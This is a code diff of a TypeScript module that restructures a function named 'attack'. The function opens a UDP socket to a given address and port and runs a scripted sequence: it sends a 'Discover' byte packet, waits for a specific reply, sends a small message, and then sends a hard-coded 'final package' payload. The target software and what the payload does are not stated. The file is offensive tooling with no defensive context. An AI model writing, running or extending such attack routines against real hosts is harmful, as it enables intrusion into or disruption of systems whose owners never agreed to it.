@@ -8,7 +8,7 @@ const messageStage1 = [
 	0, 0, 0, 109, 44, 0, 0
 ];
 
-const messageToWait = [3];
+const smallMessage = [3];
 
 const messageStage2 = [
 	5, 110, 115, 101, 217, 255, 196, 110, 72, 141, 124, 161,
@@ -19,6 +19,48 @@ const messageStage2 = [
 	0, 18, 0, 0, 0
 ];
 
+enum AttackType {
+	Send = 1,
+	Wait = 2
+}
+
+interface AttackStep {
+	type: AttackType;
+	message: number[];
+	intervalMessage?: number[];
+	comment: string;
+}
+
+const AttackRoutine: AttackStep[] = [
+	{
+		type: AttackType.Send,
+		message: messageStage1,
+		comment: "Discover"
+	},
+	{
+		type: AttackType.Wait,
+		message: smallMessage,
+		intervalMessage: messageStage1,
+		comment: "First wait"
+	},
+	{
+		type: AttackType.Send,
+		message: smallMessage,
+		comment: "Send a small message"
+	},
+	/*{
+		type: AttackType.Wait,
+		message: smallMessage,
+		intervalMessage: smallMessage,
+		comment: "Second wait"
+	},*/
+	{
+		type: AttackType.Send,
+		message: messageStage2,
+		comment: "Send final package"
+	}
+]
+
 
 function sendMessage(socket: any, message: number[]): Promise<any> {
 	return new Promise(done => {
@@ -26,43 +68,76 @@ function sendMessage(socket: any, message: number[]): Promise<any> {
 	});
 }
 
-function waitForReply(socket: any, timeout: number, intervalMessage: number[]): Promise<boolean> {
-	const intv = setInterval(sendMessage, 500, socket, intervalMessage);
+let currentWait: (msg: Buffer, rinfo: any) => Promise<void> = null;
+function waitForReply(socket: any, messageToWait: number[], timeout: number, intervalMessage?: number[]): Promise<boolean> {
+	let intv;
+	if (intervalMessage) {
+		intv = setInterval(sendMessage, 500, socket, intervalMessage);
+	}
 	return new Promise(done => {
-		socket.once("message", (msg: Buffer, rinfo: any) => {
+		currentWait = async (msg: Buffer, rinfo: any) => {
 			if (_.isEqual(msg.toJSON().data, messageToWait)) {
-				clearInterval(intv);
+				if (intv) {
+					clearInterval(intv);
+				}
+				currentWait = null;
 				done(true);
 			}
-		});
+		};
 		setTimeout(() => {
-			clearInterval(intv);
+			if (intv) {
+				clearInterval(intv);
+			}
+			currentWait = null;
 			done(false);
 		}, timeout);
 	});
 }
 
+async function performStep(socket: any, step: AttackStep, timeout: number): Promise<string> {
+	let err;
+	switch (step.type) {
+		case AttackType.Send: {
+			err = await sendMessage(socket, step.message);
+			if (err) {
+				return `Failed to perform step ${step.comment}: ${err.toString}`;
+			}
+			break;
+		}
+		case AttackType.Wait: {
+			if (!await waitForReply(socket, step.message, timeout, step.intervalMessage)) {
+				return `Empty reply on step ${step.comment}.`;
+			}
+			break;
+		}
+		default: {
+			return "Unknown step";
+		}
+	}
+	return null;
+}
+
 export async function attack(address: string, port: number, timeout: number): Promise<string> {
 	const socket = dgram.createSocket("udp4");
-	let err;
-	err = await new Promise(done => {
+	let err: string = null;
+	let connectionError: any = await new Promise(done => {
 		socket.connect(port, address, done);
 	});
-	if (err) {
-		return `Failed to connect: ${err.toString()}`;
+	if (connectionError) {
+		socket.close();
+		return `Failed to connect: ${connectionError.toString()}`;
 	}
-	err = await sendMessage(socket, messageStage1);
-	if (err) {
-		return `Failed to send stage 1: ${err.toString()}`;
-	}
-	//console.log("Waiting for reply...");
-	if (!await waitForReply(socket, timeout, messageStage1)) {
-		return `Empty reply.`;
-	}
-	err = await sendMessage(socket, messageStage2);
-	if (err) {
-		return `Failed to send stage 2: ${err.toString()}`;
+	socket.on("message", async (msg, rinfo) => {
+		if (currentWait) {
+			currentWait(msg, rinfo);
+		}
+	})
+	for (let step of AttackRoutine) {
+		err = await performStep(socket, step, timeout);
+		if (err) {
+			break;
+		}
 	}
 	socket.close();
-	return null;
+	return err;
 }
